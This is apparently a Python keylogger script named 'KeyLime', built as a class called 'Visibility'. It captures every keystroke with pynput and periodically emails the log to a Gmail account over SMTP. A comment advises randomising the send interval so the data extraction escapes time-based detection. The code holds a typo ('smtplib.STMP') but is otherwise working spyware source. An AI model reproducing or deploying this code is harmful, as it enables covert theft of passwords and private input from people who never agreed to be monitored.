#MM 08.09.2019

####                       ####      ####                       ####
####  ###             ###  ####      ####  ###             ###  ####
####     ###      ###      ####      ####     ###      ###      ####
####        ## ##          ####      ####        ## ##          ####
####          #            ####      ####          #            ####
####                       ####      ####                       ####
####                       ####      ####                       ####
####                       ####      ####                       ####
####                       ####      ####                       ####

import pynput.keyboard
import threading
import smtplib

class Visibility:
    #Constructor that removes necessary reference to global variable
    def __init__(self, time_interval, email, password):
        self.log = "KeyLime.py Initialized"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        #global log
        try:
            #Print Key as char to get rid of 'u' from user input and only return characters.
            current_key = str(key.char)     
        except AttributeError:
            #Print Spacebar key and special keys since they aren't characters.
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        #Resets Log to be empty once the file has been sent and timer is reset
        self.log = ""
        #Timer is based on seconds - Recommend to set this to random between few mins and hours
        #This negates time-based event/extraction from being recognized
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, email, password, message):
        server = smtplib.STMP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
   
    #Moved to new file that references class
    #Visibility.start(self)